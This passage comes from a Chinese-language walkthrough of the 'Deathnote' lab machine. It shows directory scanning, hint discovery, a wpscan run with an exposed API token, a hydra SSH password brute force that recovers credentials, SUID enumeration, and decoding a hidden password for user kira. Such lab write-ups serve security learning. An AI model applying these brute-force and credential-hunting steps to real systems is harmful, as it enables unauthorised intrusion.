class="symbol">/.htpasswd.jpg</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htpasswd.wbpg</span>       (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htpasswd.html</span>       (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htpasswd.php</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htm</span>                 (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htm.html</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htm.wbpg</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htm.jpg</span>             (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htm.php</span>             (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htpasswds.html</span>      (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htpasswds</span>           (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htpasswds.php</span>       (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htpasswds.wbpg</span>      (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htpasswds.jpg</span>       (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htgroup</span>             (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htgroup.html</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htgroup.wbpg</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htgroup.jpg</span>         (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htgroup.php</span>         (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/wp-forum.phps</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htaccess.bak.php</span>    (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htaccess.bak.jpg</span>    (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htaccess.bak</span>        (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htaccess.bak.html</span>   (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htaccess.bak.wbpg</span>   (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htuser.php</span>          (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htuser.html</span>         (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htuser</span>              (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htuser.jpg</span>          (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htuser.wbpg</span>         (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.ht</span>                  (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.ht.html</span>             (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htc.html</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.ht.php</span>              (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htc</span>                 (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.ht.jpg</span>              (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.ht.wbpg</span>             (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htc.wbpg</span>            (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htc.php</span>             (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="symbol">/.htc.jpg</span>             (<span class="params">Status:</span> <span class="number">403</span>) [<span class="params">Size:</span> <span class="number">279</span>]</span><br><span class="line"><span class="params">Progress:</span> <span class="number">81220</span> <span class="symbol">/</span> <span class="number">81225</span> (<span class="number">99.99</span>%)</span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line">Finished</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># curl 192.168.179.40/robots.txt                </span></span><br><span class="line">fuck <span class="keyword">it</span> <span class="keyword">my</span> dad </span><br><span class="line">added hint <span class="keyword">on</span> /important.jpg</span><br><span class="line"></span><br><span class="line">ryuk please delete <span class="keyword">it</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œæœ‰æç¤ºï¼Œæç¤ºåœ¨&#x2F;important.jpg è€Œä¸”æœ‰ä¸€ä¸ªç–‘ä¼¼ç”¨æˆ·ryuk<br>ç›´æ¥åœ¨webè®¿é—®è¿™ä¸ªè·¯å¾„ä¼šæ˜¾ç¤ºä¸å‡ºä»»ä½•ä¸œè¥¿ï¼Œåªæœ‰ä¸€ä¸ªé”™è¯¯å›¾ç‰‡çš„æ ‡å¿—ï¼Œä½†æ˜¯ç”¨curlè®¿é—®æœ‰æ˜¾ç¤ºæ–‡å­—</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># curl http://192.168.179.40/important.jpg</span></span><br><span class="line">i am Soichiro Yagami, light&#x27;s father</span><br><span class="line">i have a doubt <span class="keyword">if</span> L <span class="keyword">is</span> <span class="literal">true</span> <span class="keyword">about</span> <span class="keyword">the</span> assumption <span class="keyword">that</span> light <span class="keyword">is</span> kira</span><br><span class="line"></span><br><span class="line">i can only help you <span class="keyword">by</span> giving something important</span><br><span class="line"></span><br><span class="line">login username : user.txt</span><br><span class="line">i don&#x27;t know <span class="keyword">the</span> password.</span><br><span class="line">find <span class="keyword">it</span> <span class="keyword">by</span> yourself </span><br><span class="line"><span class="keyword">but</span> i think <span class="keyword">it</span> <span class="keyword">is</span> <span class="keyword">in</span> <span class="keyword">the</span> hint section <span class="keyword">of</span> site</span><br></pre></td></tr></table></figure></div>
<p>é‚£å°±ç†Ÿæ‚‰äº†å“ˆå“ˆå“ˆ lightå’ŒLæ˜¯æˆ‘çŸ¥é“çš„äººåã€‚ è¿™é‡Œæç¤ºç™»å½•çš„ç”¨æˆ·åuser.txtï¼Œå¯†ç åœ¨hint section<br>åˆšæ‰ç›®å½•è¿˜æœ‰æ‰«å‡ºä¸€ä¸ªindex.html ç°åœ¨å»çœ‹çœ‹,ä½†æ˜¯è®¿é—®ä¸äº†ï¼Œåˆè·³è½¬åˆ°ä¸€ä¸ªä¸çŸ¥é“çš„url<br>æç¤ºåœ¨hintéƒ¨åˆ†ï¼Œå†è®¿é—®ä¸€ä¸‹192.168.179.40&#x2F;hint , æ²¡æœ‰ã€‚&#x2F;important&#x2F;hint æ²¡æœ‰ã€‚<br>è¿™é‡Œæˆ‘çœ‹ä½äº†ï¼Œçœ‹äº†ä¸‹ç¾¤ä¸»ll104567çš„è§†é¢‘ï¼Œå‘ç°æˆ‘çš„æ€è·¯æœ‰ç‚¹é—®é¢˜ï¼Œç¡®å®æœ‰ç”¨åˆ°wordpressï¼Œ<br>æ ¹æ®ç›´æ¥è®¿é—®çš„ç»“æœï¼Œè¦ä¿®æ”¹ä¸€ä¸‹hostsæ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl 192.168.179.40                  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;1; url=&#x27;http://deathnote.vuln/wordpress&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">cente</span>&gt;</span> <span class="tag">&lt;<span class="name">p</span>&gt;</span>Please wait.....<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p><code>192.168.179.40 deathnote.vuln</code></p>
<p><img src="https://pic1.imgdb.cn/item/67aac252d0e0a243d4fe3e55.png"><br>å¸…<br><img src="https://pic1.imgdb.cn/item/67aac3abd0e0a243d4fe3f3b.png"><br>è¿™ä¸ªmy fav line is iamjustic3 ä¸€å®šæœ‰ç”¨ï¼Œä¸ç„¶ä¸ä¼šæ”¾åœ¨è¿™é‡Œ<br>ç°åœ¨å†ç”¨wpscanæ‰«ä¸€ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># wpscan --api-token r4NahZxa7hHyx6tcZVYdfivP0YNXqmTaJXwqgMatwmE  --enumerate u,vp --plugins-detection aggressive --url http://deathnote.vuln/wordpress</span></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|<span class="string"></span></span><br><span class="line"><span class="string">          \ \  /\  / /</span>|<span class="string"> </span>|<span class="string">__) </span>|<span class="string"> (___   ___  __ _ _ __ Â®</span></span><br><span class="line"><span class="string">           \ \/  \/ / </span>|<span class="string">  ___/ \___ \ / __</span>|<span class="string">/ _` </span>|<span class="string"> &#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  </span>|<span class="string"> </span>|<span class="string">     ____) </span>|<span class="string"> (__</span>|<span class="string"> (_</span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|</span><br><span class="line">             \/  \/   |<span class="string">_</span>|<span class="string">    </span>|<span class="string">_____/ \___</span>|<span class="string">\__,_</span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string">_</span>|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.27</span><br><span class="line">       Sponsored by Automattic - https://automattic.com/</span><br><span class="line">       <span class="meta">@_WPScan_,</span> <span class="meta">@ethicalhack3r,</span> <span class="meta">@erwan_lr,</span> <span class="meta">@firefart</span></span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: http://deathnote.vuln/wordpress/wp-content/uploads/</span><br><span class="line"> |<span class="string"> Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> </span>|<span class="string"> Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure></div>
<p>æ‰¾åˆ°äº†ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„åœ°å€ï¼Œå»çœ‹çœ‹ï¼Œè¿™é‡Œå¯ä»¥æŸ¥çœ‹æ–‡ä»¶<br><img src="https://pic1.imgdb.cn/item/67aad515d0e0a243d4fe42ae.png"><br><img src="https://pic1.imgdb.cn/item/67aad51ed0e0a243d4fe42af.png"><br>å¦‚æœåœ¨hintç›®å½•ä¸‹ç›´æ¥çœ‹æºç ä¹Ÿèƒ½å‘ç°è¿™ä¸ªè·¯å¾„<br><img src="https://pic1.imgdb.cn/item/67aac706d0e0a243d4fe4050.png"><br>åœ¨è¿™é‡Œæ‰¾åˆ°äº†user.txt å’Œ note.txt user.txtè‚¯å®šæ˜¯ç”¨æˆ·åï¼Œä½†æ˜¯noteä¸ä¸€å®šæ˜¯å¯†ç <br>å…ˆç”¨hydraçˆ†ç ´ä¸€ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# hydra -L <span class="keyword">user</span>.txt -P note.txt ssh://<span class="number">192.168</span><span class="number">.179</span><span class="number">.40</span></span><br><span class="line">Hydra v9<span class="number">.5</span> (c) <span class="number">2023</span> <span class="keyword">by</span> van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> <span class="keyword">not</span> use <span class="keyword">in</span> military <span class="keyword">or</span> secret service organizations, <span class="keyword">or</span> <span class="keyword">for</span> illegal purposes (this <span class="keyword">is</span> non-binding, these *** ignore laws <span class="keyword">and</span> ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at <span class="number">2025</span><span class="number">-02</span><span class="number">-11</span> <span class="number">12</span>:<span class="number">13</span>:<span class="number">22</span></span><br><span class="line">[<span class="built_in">WARNING</span>] Many SSH configurations <span class="keyword">limit</span> the number <span class="keyword">of</span> parallel tasks, it <span class="keyword">is</span> recommended <span class="keyword">to</span> reduce the tasks: use -t <span class="number">4</span></span><br><span class="line">[DATA] max <span class="number">16</span> tasks per <span class="number">1</span> <span class="keyword">server</span>, overall <span class="number">16</span> tasks, <span class="number">731</span> <span class="keyword">login</span> tries (l:<span class="number">17</span>/p:<span class="number">43</span>), ~<span class="number">46</span> tries per task</span><br><span class="line">[DATA] attacking ssh://<span class="number">192.168</span><span class="number">.179</span><span class="number">.40</span>:<span class="number">22</span>/</span><br><span class="line">[STATUS] <span class="number">280.00</span> tries/min, <span class="number">280</span> tries <span class="keyword">in</span> <span class="number">00</span>:<span class="number">01</span>h, <span class="number">453</span> <span class="keyword">to</span> <span class="keyword">do</span> <span class="keyword">in</span> <span class="number">00</span>:<span class="number">02</span>h, <span class="number">14</span> active</span><br><span class="line">[<span class="number">22</span>][ssh] host: <span class="number">192.168</span><span class="number">.179</span><span class="number">.40</span>   <span class="keyword">login</span>: l   <span class="keyword">password</span>: death4me</span><br><span class="line">[STATUS] <span class="number">283.00</span> tries/min, <span class="number">566</span> tries <span class="keyword">in</span> <span class="number">00</span>:<span class="number">02</span>h, <span class="number">167</span> <span class="keyword">to</span> <span class="keyword">do</span> <span class="keyword">in</span> <span class="number">00</span>:<span class="number">01</span>h, <span class="number">14</span> active</span><br><span class="line"><span class="number">1</span> <span class="keyword">of</span> <span class="number">1</span> target successfully completed, <span class="number">1</span> <span class="keyword">valid</span> <span class="keyword">password</span> <span class="built_in">found</span></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at <span class="number">2025</span><span class="number">-02</span><span class="number">-11</span> <span class="number">12</span>:<span class="number">16</span>:<span class="number">03</span></span><br></pre></td></tr></table></figure></div>
<p>æˆåŠŸæ‹¿åˆ°ç”¨æˆ·åå’Œå¯†ç <br>ç™»å½•lçš„shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">                                                                                                                    </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># ssh l@192.168.179.40    </span></span><br><span class="line">l@<span class="number">192.168</span><span class="number">.179</span><span class="number">.40</span>&#x27;s password: </span><br><span class="line">Linux deathnote <span class="number">4.19</span><span class="number">.0</span><span class="number">-17</span>-amd64 <span class="comment">#1 SMP Debian 4.19.194-2 (2021-06-21) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> <span class="keyword">the</span> Debian GNU/Linux system are free software;</span><br><span class="line"><span class="keyword">the</span> exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> <span class="keyword">the</span></span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes <span class="keyword">with</span> ABSOLUTELY NO WARRANTY, <span class="keyword">to</span> <span class="keyword">the</span> extent</span><br><span class="line">permitted <span class="keyword">by</span> applicable law.</span><br><span class="line">Last login: Sat Sep  <span class="number">4</span> <span class="number">06</span>:<span class="number">12</span>:<span class="number">29</span> <span class="number">2021</span> <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.6</span></span><br><span class="line">l@deathnote:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> l: </span><br><span class="line">Sorry, user l may <span class="keyword">not</span> <span class="built_in">run</span> sudo <span class="keyword">on</span> deathnote.</span><br><span class="line">l@deathnote:~$ </span><br></pre></td></tr></table></figure></div>
<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><p>åˆšåˆšçœ‹äº†æ²¡æœ‰sudoï¼Œå†å»çœ‹çœ‹suidï¼Œä¹Ÿæ²¡æœ‰ä»€ä¹ˆ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line">l<span class="variable">@deathnote</span>:~<span class="variable">$ </span>find / -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/openssh/ssh</span>-keysign</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/eject/dmcrypt</span>-get-device</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/dbus-1.0/dbus</span>-daemon-launch-helper</span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/umount</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/su</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/sudo</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/newgrp</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/mount</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/gpasswd</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chfn</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/passwd</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chsh</span></span><br></pre></td></tr></table></figure></div>
<p>å®¶ç›®å½•æœ‰ä¸ªuser.txt æ˜¯Brainfuck åŠ å¯†ï¼Œè§£å¯†ä¹‹åå†…å®¹æ˜¯</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VBNET"><figure class="iseeu highlight /vbnet"><table><tr><td class="code"><pre><span class="line"><span class="comment">&#x27;i think u got the shell , but you wont be able to kill me -kira&#x27;</span></span><br></pre></td></tr></table></figure></div>
<p>ä½†æ˜¯åªæœ‰ä¸€å¥æŒ‘è¡…çš„è¯ï¼Œæ²¡æœ‰å…¶ä»–å†…å®¹<br>ä¸‹é¢å› ä¸ºsudoå’Œsuidéƒ½ç”¨ä¸äº†,è€Œä¸”&#x2F;homeç›®å½•ä¸‹è¿˜æœ‰ä¸€ä¸ªkiraç”¨æˆ·ï¼Œæ‰€ä»¥è‚¯å®šè¿˜è¦å…ˆå¾—åˆ°kira<br>é‚£å°±æ‰¾ä¸€ä¸‹lçš„æ–‡ä»¶ï¼Œä½†æ˜¯å±äºlçš„æ–‡ä»¶å¤ªå¤šäº†ï¼Œæˆ‘å°±æ‰¾åå­—æ˜¯lçš„</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GRADLE"><figure class="iseeu highlight /gradle"><table><tr><td class="code"><pre><span class="line">l@deathnote:~$ <span class="keyword">find</span> <span class="regexp">/ -name &quot;l&quot; 2&gt;/</span>dev/<span class="keyword">null</span></span><br><span class="line"><span class="regexp">/home/</span>l</span><br><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/terminfo/</span>l</span><br><span class="line"><span class="regexp">/usr/</span>lib<span class="regexp">/terminfo/</span>l</span><br><span class="line"><span class="regexp">/var/</span>lib<span class="regexp">/sudo/</span>lectured/l</span><br><span class="line"></span><br><span class="line">l@deathnote:~$ <span class="keyword">find</span> <span class="regexp">/ -name &quot;L&quot; 2&gt;/</span>dev/<span class="keyword">null</span></span><br><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/terminfo/</span>L</span><br><span class="line"><span class="regexp">/opt/</span>L</span><br></pre></td></tr></table></figure></div>
<p>å‘ç°ä¸€ä¸ªå¯ç–‘çš„æ–‡ä»¶&#x2F;opt&#x2F;L</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">l<span class="variable">@deathnote</span><span class="symbol">:/opt/L</span><span class="variable">$ </span>ls</span><br><span class="line">fake-notebook-rule  kira-<span class="keyword">case</span></span><br><span class="line">l<span class="variable">@deathnote</span><span class="symbol">:/opt/L</span><span class="variable">$ </span>cd fake-notebook-rule/</span><br><span class="line">l<span class="variable">@deathnote</span><span class="symbol">:/opt/L/fake-notebook-rule</span><span class="variable">$ </span>ls</span><br><span class="line"><span class="keyword">case</span>.wav  hint</span><br><span class="line">l<span class="variable">@deathnote</span><span class="symbol">:/opt/L/fake-notebook-rule</span><span class="variable">$ </span>file hint</span><br><span class="line"><span class="symbol">hint:</span> <span class="variable constant_">ASCII</span> text</span><br><span class="line">l<span class="variable">@deathnote</span><span class="symbol">:/opt/L/fake-notebook-rule</span><span class="variable">$ </span>cat hint </span><br><span class="line">use cyberchef</span><br><span class="line"></span><br><span class="line">l<span class="variable">@deathnote</span><span class="symbol">:/opt/L/fake-notebook-rule</span><span class="variable">$ </span>cat <span class="keyword">case</span>.wav </span><br><span class="line"><span class="number">63</span> <span class="number">47</span> <span class="number">46</span> 7a <span class="number">63</span> <span class="number">33</span> <span class="number">64</span> 6b <span class="number">49</span> <span class="number">44</span> 6f <span class="number">67</span> <span class="number">61</span> <span class="number">32</span> 6c <span class="number">79</span> <span class="number">59</span> <span class="number">57</span> 6c 7a 5a <span class="number">58</span> 5a <span class="number">70</span> <span class="number">62</span> <span class="number">43</span> <span class="number">41</span> 3d</span><br></pre></td></tr></table></figure></div>
<p>æœç„¶æœ‰ç”¨ï¼Œå»cyberchefè§£å¯†ä¸€ä¸‹<br>å…ˆç”¨from hexè§£å¯†å‡ºä¸€ä¸ªbase64ç¼–ç ï¼Œå†ç”¨base64è§£å¯†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ADA"><figure class="iseeu highlight /ada"><table><tr><td class="code"><pre><span class="line">passwd : <span class="type">kiraisevil</span> </span><br></pre></td></tr></table></figure></div>
<p>å¦ä¸€ä¸ªæ–‡ä»¶æ˜¯ä¸€ä¸ªæ—¥è®°</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">l<span class="variable">@deathnote</span><span class="symbol">:/opt/L/kira-case</span><span class="variable">$ </span>cat <span class="keyword">case</span>-file.txt </span><br><span class="line">the <span class="title class_">FBI</span> agent died on <span class="title class_">December</span> <span class="number">27</span>, <span class="number">2006</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> week <span class="keyword">after</span> the investigation of the task-force member/head.</span><br><span class="line">aka.....</span><br><span class="line"><span class="title class_">Soichiro</span> <span class="title class_">Yagami</span><span class="string">&#x27;s family .</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">hmmmmmmmmm......</span></span><br><span class="line"><span class="string">and according to watari ,</span></span><br><span class="line"><span class="string">he died as other died after Kira targeted them .</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">and we also found something in </span></span><br><span class="line"><span class="string">fake-notebook-rule folder .</span></span><br></pre></td></tr></table></figure></div>
<p>æ­»äº¡ç¬”è®°çš„è§„åˆ™å“ˆå“ˆå“ˆå“ˆï¼Œçœ‹è¿‡è¿™ä¸ªåŠ¨æ¼«çš„çŸ¥é“è¿™ä¸ªæ¢—ï¼ŒåŸæ¥è¿™å°±æ˜¯deathnoteçš„ä½¿ç”¨æ–¹æ³•å“ˆå“ˆå“ˆå“ˆ<br>ç°åœ¨æœ‰äº†kiraçš„å¯†ç å°±åˆ‡æ¢åˆ°kiraç”¨æˆ·<br>çœ‹äº†ç¾¤ä¸»ll104567çš„è§†é¢‘ï¼Œå‘ç°è¿˜æœ‰å¦ä¸€ç§æ€è·¯å¯ä»¥åˆ‡æ¢åˆ°kira</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">l<span class="variable">@deathnote</span><span class="symbol">:/opt/L/kira-case</span><span class="variable">$ </span>cd /home</span><br><span class="line">l<span class="variable">@deathnote</span><span class="symbol">:/home</span><span class="variable">$ </span>ls</span><br><span class="line">kira  l</span><br><span class="line">l<span class="variable">@deathnote</span><span class="symbol">:/home</span><span class="variable">$ </span>cd kira</span><br><span class="line"></span><br><span class="line">l<span class="variable">@deathnote</span><span class="symbol">:/home/kira</span><span class="variable">$ </span>ls -al</span><br><span class="line">total <span class="number">36</span></span><br><span class="line">drwxr-xr-x <span class="number">4</span> kira kira <span class="number">4096</span> <span class="title class_">Sep</span>  <span class="number">4</span>  <span class="number">2021</span> .</span><br><span class="line">drwxr-xr-x <span class="number">4</span> root root <span class="number">4096</span> <span class="title class_">Jul</span> <span 